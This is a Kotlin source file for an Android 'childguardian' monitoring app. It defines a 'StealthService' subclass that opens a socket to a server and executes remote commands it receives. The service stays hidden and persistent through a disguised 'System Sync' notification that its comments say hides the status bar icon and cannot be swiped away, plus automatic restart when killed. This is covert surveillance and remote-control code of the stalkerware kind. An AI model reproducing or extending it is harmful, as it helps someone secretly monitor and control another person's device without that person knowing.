package com.childguardian.services.core

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import androidx.core.app.NotificationCompat
import com.childguardian.services.base.StealthService
import dagger.hilt.android.AndroidEntryPoint
import timber.log.Timber
import com.childguardian.data.remote.socket.SocketManager
import com.childguardian.data.repository.DeviceRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import javax.inject.Inject
@AndroidEntryPoint
class CoreService : StealthService() {
    @Inject
    lateinit var gson: com.google.gson.Gson

    @Inject
    lateinit var commandProcessor: com.childguardian.domain.command.CommandProcessor
    @Inject
    lateinit var socketManager: SocketManager

    @Inject
    lateinit var deviceRepository: DeviceRepository

    companion object {
        private const val CHANNEL_ID = "core_sync_channel"
        private const val NOTIFICATION_ID = 1001
    }

    override fun onCreate() {
        super.onCreate()
        Timber.d("CoreService created")
        // Get deviceId from local storage and connect socket
        CoroutineScope(Dispatchers.IO).launch {
            val deviceId = deviceRepository.getDeviceInfoSync()?.deviceId
            if (deviceId != null) {
                socketManager.connect(deviceId)

                // ADD THIS LISTENER HERE
                socketManager.on("command") { args ->
                    val data = args[0].toString()
                    Timber.d("Command received from server: $data")
                    try {
                        val remoteCommand = gson.fromJson(
                            data,
                            com.childguardian.domain.command.RemoteCommand::class.java
                        )
                        commandProcessor.processCommand(remoteCommand)
                    } catch (e: Exception) {
                        Timber.e(e, "Error parsing command from server")
                    }
                }
            }
        }
        // >>> THE SAFETY SWITCH: Start the notification immediately <<<
        startForegroundServiceSafely()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        Timber.d("CoreService started")

        // This tells Android: "If this service is killed by the system to free up RAM,
        // restart it automatically as soon as possible."
        return START_STICKY
    }

    private fun startForegroundServiceSafely() {
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // 1. Build the Notification Channel (Required for Android 8+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Sync", // Discreet name seen in settings
                NotificationManager.IMPORTANCE_MIN // Makes it completely silent and hides status bar icon
            ).apply {
                description = "Maintains background data synchronization"
                setShowBadge(false)
            }
            notificationManager.createNotificationChannel(channel)
        }

        // 2. Build the discreet Notification
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_info_details) // Using default Android icon for now
            .setContentTitle("Device Sync")
            .setContentText("Syncing data in background...")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true) // Prevents the user from swiping it away
            .build()

        // 3. Ignite the Foreground Service with the Data Sync flag (Required for Android 14)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Timber.d("CoreService destroyed")
    }
}